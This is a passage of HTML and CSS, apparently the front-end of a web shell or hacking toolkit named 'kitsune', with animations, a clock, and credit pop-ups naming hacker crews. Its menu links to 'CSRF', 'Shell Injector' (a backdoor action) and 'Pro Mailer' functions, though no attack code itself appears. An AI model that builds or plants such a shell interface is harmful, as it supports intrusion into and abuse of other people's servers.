          animation-delay: 6.93177s;
}
span:nth-child(9):after {
  -webkit-animation-delay: 7.36139s;
          animation-delay: 7.36139s;
}
span:nth-child(10):before {
  -webkit-animation-delay: 7.76139s;
          animation-delay: 7.76139s;
}
span:nth-child(10):after {
  -webkit-animation-delay: 8.16139s;
          animation-delay: 8.16139s;
}
span:before, span:after {
  display: block;
  content: attr(data-text);
  -webkit-animation: 1.48889s ease-out both;
          animation: 1.48889s ease-out both;
  -webkit-animation-name: inherit;
          animation-name: inherit;
  text-shadow: 0 0 0em;
}
span:before {
  -webkit-clip-path: polygon(0 0 100% 0, 100% 100%);
  clip-path: polygon(0 0 100% 0, 100% 100%);
  position: absolute;
  -webkit-transform-origin: left center;
          transform-origin: left center;
  color: #4EC0B6;
}
span:after {
  -webkit-clip-path: polygon(0 0, 100% 100%, 0 100%);
  clip-path: polygon(0 0, 100% 100%, 0 100%);
  color: #3967CB;
}
</style>
<center>
     <style>
	.waktu {
		overflow: hidden;
		width: 220px;
	}
	.kotak{
		float: left;
		width: 70px;
		height: 80px;
	}
	.waktu p {
		color: red;
		font-face: Icaland;
		font-size: 36px;
		text-align: center;
		margin-top: 30px;
	}
    </style>
<span data-text="."></span>
<span data-text="/"></span>
<span data-text="k"></span>
<span data-text="i"></span>
<span data-text="t"></span>
<span data-text="s"></span>
<span data-text="u"></span>
<span data-text="n"></span>
<span data-text="e"></span>
<div class="waktu">
	<div class="kotak">
		<p id="jam"></p>
	</div>
	<div class="kotak">
		<p id="menit"></p>
	</div>
	<div class="kotak">
		<p id="detik"></p>
	</div>
</div>
<script>
	window.setTimeout("waktu()", 1000);
	function waktu() {
		var waktu = new Date();
		setTimeout("waktu()", 1000);
		document.getElementById("jam").innerHTML = waktu.getHours();
		document.getElementById("menit").innerHTML = waktu.getMinutes();
		document.getElementById("detik").innerHTML = waktu.getSeconds();
	}
</script>

<style>
.free {
  box-sizing: border-box;
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
  background-color: transparent;
  border: 2px solid #e74c3c;
  border-radius: 0.6em;
  color: #e74c3c;
  cursor: pointer;
  display: flex;
  align-self: center;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1;
  margin: 20px;
  padding: 1.2em 2.8em;
  text-decoration: none;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
}
.free:hover, .free:focus {
  color: #fff;
  outline: 0;
}
.upload {
  border-color: #3498db;
  color: #fff;
  box-shadow: 0 0 40px 40px #3498db inset, 0 0 0 0 #3498db;
  transition: all 150ms ease-in-out;
}
.upload:hover {
  box-shadow: 0 0 10px 0 #3498db inset, 0 0 10px 4px #3498db;
}
</style>

<br>
	<table>
		<tr>
            <td><button class="free upload"><a href="?kitsune=csrf" class="upload">-CSRF</a></button></td>
	        <td><button class="free upload"><a href="?kitsune=backdoor" class="upload">Shell Injector</a></button></td>
            <td><button class="free upload"><a href="?kitsune=promailer" class="upload">Pro Mailer</a></button></td>
	    </tr>
	</table>
<br>

<style>
/* Tombol Button Pesan */
#friends {
  box-sizing: border-box;
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
  background-color: transparent;
  border: 2px solid #e74c3c;
  border-radius: 0.6em;
  color: #e74c3c;
  cursor: pointer;
  display: flex;
  align-self: center;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1;
  margin: 20px;
  padding: 1.2em 2.8em;
  text-decoration: none;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
}

#friends:hover, #friends:focus {
  color: #fff;
  outline: 0;
}

#friends a {
	width: 100px;
	height: 30px;
	vertical-align: middle;
	background-color: #F00;
	color: #fff;
	text-decoration: none;
	padding: 10px;
	border-radius: 5px;
	border: 1px solid transparent;
}

/* Jendela Pop Up */
#f_topup {
	width: 100%;
	height: 100%;
	position: fixed;
	background: rgba(0,0,0,.7);
	top: 0;
	left: 0;
	z-index: 9999;
	visibility: hidden;
}

.window {
	width: 400px;
	height: 400px;
	background: #fff;
	border-radius: 10px;
	position: relative;
	padding: 10px;
	text-align: center;
	margin: 15% auto;
}
.window h2 {
	margin: 20px 0 0 0;
}
/* Button Close */
.close-friends {
	width: 6%;
	height: 6%;
	line-height: 23px;
	background: #000;
	border-radius: 50%;
	border: 3px solid #fff;
	display: block;
	text-align: center;
	color: #fff;
	text-decoration: none;
	position: absolute;
	top: -10px;
	right: -10px;	
}

/* Memunculkan Jendela Pop Up*/
#f_topup:target {
	visibility: visible;
}


/* Tombol Button Pesan */
#team {
  box-sizing: border-box;
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
  background-color: transparent;
  border: 2px solid #e74c3c;
  border-radius: 0.6em;
  color: #e74c3c;
  cursor: pointer;
  display: flex;
  align-self: center;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1;
  margin: 20px;
  padding: 1.2em 2.8em;
  text-decoration: none;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
}

#team:hover, #team:focus {
  color: #fff;
  outline: 0;
}
#team a {
	width: 100px;
	height: 30px;
	vertical-align: middle;
	background-color: #F00;
	color: #fff;
	text-decoration: none;
	padding: 10px;
	border-radius: 5px;
	border: 1px solid transparent;
}

/* Jendela Pop Up */
#t_topup {
	width: 100%;
	height: 100%;
	position: fixed;
	background: rgba(0,0,0,.7);
	top: 0;
	left: 0;
	z-index: 9999;
	visibility: hidden;
}

.window {
	width: 400px;
	height: 400px;
	background: #fff;
	border-radius: 10px;
	position: relative;
	padding: 10px;
	text-align: center;
	margin: 15% auto;
}
.window h2 {
	margin: 20px 0 0 0;
}
/* Button Close */
.close-team {
	width: 6%;
	height: 6%;
	line-height: 23px;
	background: #000;
	border-radius: 50%;
	border: 3px solid #fff;
	display: block;
	text-align: center;
	color: #fff;
	text-decoration: none;
	position: absolute;
	top: -10px;
	right: -10px;	
}

/* Memunculkan Jendela Pop Up*/
#t_topup:target {
	visibility: visible;
}



/* Tombol Button Pesan */
#sup {
  box-sizing: border-box;
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
  background-color: transparent;
  border: 2px solid #e74c3c;
  border-radius: 0.6em;
  color: #e74c3c;
  cursor: pointer;
  display: flex;
  align-self: center;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1;
  margin: 20px;
  padding: 1.2em 2.8em;
  text-decoration: none;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
}

#sup:hover, #sup:focus {
  color: #fff;
  outline: 0;
}
#sup a {
	width: 100px;
	height: 30px;
	vertical-align: middle;
	background-color: #F00;
	color: #fff;
	text-decoration: none;
	padding: 10px;
	border-radius: 5px;
	border: 1px solid transparent;
}

/* Jendela Pop Up */
#s_topup {
	width: 100%;
	height: 100%;
	position: fixed;
	background: rgba(0,0,0,.7);
	top: 0;
	left: 0;
	z-index: 9999;
	visibility: hidden;
}

.window {
	width: 400px;
	height: 400px;
	background: #fff;
	border-radius: 10px;
	position: relative;
	padding: 10px;
	text-align: center;
	margin: 15% auto;
}
.window h2 {
	margin: 20px 0 0 0;
}
/* Button Close */
.close-sup {
	width: 6%;
	height: 6%;
	line-height: 23px;
	background: #000;
	border-radius: 50%;
	border: 3px solid #fff;
	display: block;
	text-align: center;
	color: #fff;
	text-decoration: none;
	position: absolute;
	top: -10px;
	right: -10px;	
}

/* Memunculkan Jendela Pop Up*/
#s_topup:target {
	visibility: visible;
}
</style>

<table>
<tr>
  <td>
    <div id="friends"><a href="#f_topup">Thanks to my own team</a></div>
    <div id="f_topup">
    	<div class="window">
        	<a href="#" class="close-friends" title="Close">X</a>
            <h2>.-:[ MhankBarBar ]:-.<br>.-:[ Krypton ]:-.<br>.-:[ Underfif ]:-.<br>.-:[ GiovaIT ]:-.<br>.-:[ NoneX9 ]:-.<br>.-:[ ITacHI ]:-.</h2>
        </div>
    </div>
  </td>
  <td>
     <div id="team"><a href="#t_topup">Thanks to my friends</a></div>
    <div id="t_topup">
    	<div class="window">
        	<a href="#" class="close-team" title="Close">X</a>
            <h2>.-:[ Mr.TenAr ]:-.<br>.-:[ ./sendpie404 ]:-.<br>.-:[ Icha ]:-.<br>.-:[ ./TanpaNama ]:-.<br>.-:[ ./0xpl01t3r ]:-.<br>.-:[ Tex7ure ]:-.<br>.-:[ Devil_Star ]:-.<br>.-:[ Babacang07 ]:-.<br>.-:[ Cahsun147 ]:-.<br>.-:[ Havin27 ]:-.<br>.-:[ S3X-B3B4S ]:-.<br>.-:[ Mrs.Cahsun ]:-.</h2>
        </div>
    </div>
  </td>
  <td>
     <div id="sup"><a href="#s_topup">Supported by</a></div>
    <div id="s_topup">
    	<div class="window">
        	<a href="#" class="close-sup" title="Close">X</a>
            <h2>.-:[ Red Eye Cyber Team ]:-.<br>.-:[ Dark Clown Security ]:-.<br>.-:[ Black Demonstration Cyber ]:-.<br>.-:[ Phantom Security ]:-.<br>.-:[ Half Seen Samael ]:-.<br>.-:[ Clown Security Team ]:-.</h2>
        </div>
    </div>
  </td>
</tr>
</table>
<script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-3b9142cc-dafb-446b-b5cf-7d97f46232cc"></div></td></tr></tbody></table></center></body>
<script type="text/javascript" src="https://www.cssscript.com/demo/minimalist-falling-snow-effect-with-pure-javascript-snow-js/snow.js"></script>
<script type="text/javascript" src="https://www.cssscript.com/demo/minimalist-falling-snow-effect-with-pure-javascript-snow-js/snow.js"></script>
</center>
</html>
